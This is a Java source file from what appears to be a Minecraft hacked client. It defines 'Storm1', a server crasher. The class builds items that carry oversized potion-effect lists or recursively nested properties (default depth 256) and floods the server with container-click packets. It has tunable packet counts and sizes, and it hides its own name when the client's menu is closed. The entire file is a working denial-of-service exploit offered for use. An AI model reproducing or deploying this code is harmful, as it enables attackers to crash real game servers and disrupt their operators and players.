package us.whitedev.crashers.impl;

import de.florianmichael.vialoadingbase.ViaLoadingBase;
import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.network.protocol.game.ServerboundContainerClickPacket;
import net.minecraft.world.inventory.ClickType;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;
import us.whitedev.crashers.Crasher;
import us.whitedev.gui.clickgui.ClickGui;
import us.whitedev.helpers.PacketHelper;
import us.whitedev.protocol.RedSignalProtocol;
import us.whitedev.protocol.components.data.DataComponents;
import us.whitedev.protocol.components.data.impl.DataPotionContent;
import us.whitedev.protocol.components.objects.PotionEffect;
import us.whitedev.protocol.components.objects.Properties;
import us.whitedev.protocol.packets.PacketCodec;
import us.whitedev.protocol.packets.play.PacketContainerClick;
import us.whitedev.utils.OptionType;
import us.whitedev.utils.OptionUtil;

import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.Optional;

public class Storm1 implements Crasher {
    private static final String METHOD_NAME = "Storm1";
    private boolean enabled = false;

    @Override
    public void onMethod(String[] args) {
        int packets = Integer.parseInt(args[2]);
        int size = Integer.parseInt(args[3]);
        int depth = Integer.parseInt(args[4]);
        String type = args[5].toLowerCase(Locale.ROOT);
        boolean boost = Boolean.parseBoolean(args[6]);
        setEnabled(true);

        msgHelper.sendMessage("Starting crashing with &f" + (ClickGui.IS_VISIBLE ? getName() : "******"), true);
        int protocol = ViaLoadingBase.getInstance().getTargetVersion().getVersion();
        if (RedSignalProtocol.SUPPORTED_PROTOCOLS.contains(protocol)) {
            Int2ObjectMap<us.whitedev.protocol.components.objects.ItemStack> itemMap = new Int2ObjectOpenHashMap<>();
            us.whitedev.protocol.components.objects.ItemStack itemStack = new us.whitedev.protocol.components.objects.ItemStack(1, 1, getDataComponents(protocol, size, depth));

            PacketCodec.sendPacket(new PacketContainerClick(protocol, 0, 1, 10,
                    PacketContainerClick.ContainerActionType.CLICK_ITEM, PacketContainerClick.ContainerAction.RIGHT_CLICK,
                    itemStack, itemMap), packets);
        } else {
            Int2ObjectMap<ItemStack> itemMap = new Int2ObjectOpenHashMap<>();
            ItemStack itemStack = new ItemStack(type.equalsIgnoreCase("strong") ? Items.DIRT : Items.POTION, 1, Optional.of(getNBTComponents(size, boost)));

            for (int i = 0; i < packets; i++)
                PacketHelper.send(new ServerboundContainerClickPacket(0, 0, 1, 1, ClickType.PICKUP, itemStack, itemMap));
        }
        setEnabled(false);
        msgHelper.sendMessage("Attack &asuccessful &7finished!", true);
    }

    private DataComponents getDataComponents(int protocol, int power, int depth) {

        DataComponents dataComponents = new DataComponents();
        List<PotionEffect> customEffects = new ArrayList<>();

        for (int i = 0; i < power; i++) {
            customEffects.add(new PotionEffect(1, buildNestedProperties(depth)));
        }

        DataPotionContent dataPotionContent = new DataPotionContent(protocol, 1, 1, customEffects, "RedSignalClient");
        dataComponents.put(dataPotionContent);

        return dataComponents;
    }

    private CompoundTag getNBTComponents(int size, boolean boost) {
        ListTag effectsList = new ListTag();

        CompoundTag effect = new CompoundTag();
        if (boost) {
            effect.putByte("Id", (byte) 1);
            effect.putByte("Amplifier", (byte) 1);
            effect.putInt("Duration", 1);
        }

        for (int i = 1; i < size; i++)
            effectsList.add(effect);

        CompoundTag tag = new CompoundTag();
        tag.put("CustomPotionEffects", effectsList);

        CompoundTag display = new CompoundTag();
        display.putString("Name", "");
        tag.put("display", display);

        return tag;
    }

    private Properties buildNestedProperties(int depth) {
        if (depth <= 0) return null;
        return new Properties(0, 0, true, true, true, buildNestedProperties(depth - 1));
    }


    @Override
    public String getName() {
        return METHOD_NAME;
    }

    @Override
    public boolean getEnabled() {
        return enabled;
    }

    @Override
    public void setEnabled(boolean bool) {
        this.enabled = bool;
    }

    @Override
    public List<OptionUtil> getOptions() {
        return List.of(
                new OptionUtil("Packets", OptionType.INTEGER),
                new OptionUtil("Size", OptionType.INTEGER),
                new OptionUtil("Depth", OptionType.INTEGER),
                new OptionUtil("Type", OptionType.LIST, new String[]{"Strong", "Normal"}),
                new OptionUtil("Boost", OptionType.BOOLEAN)
        );
    }

    @Override
    public String getArgsUsage() {
        return "packets[100], size[10], depth[256], type[strong], boost[false]";
    }

    @Override
    public String getDescription() {
        return "Potion NBT/Components Crasher";
    }
}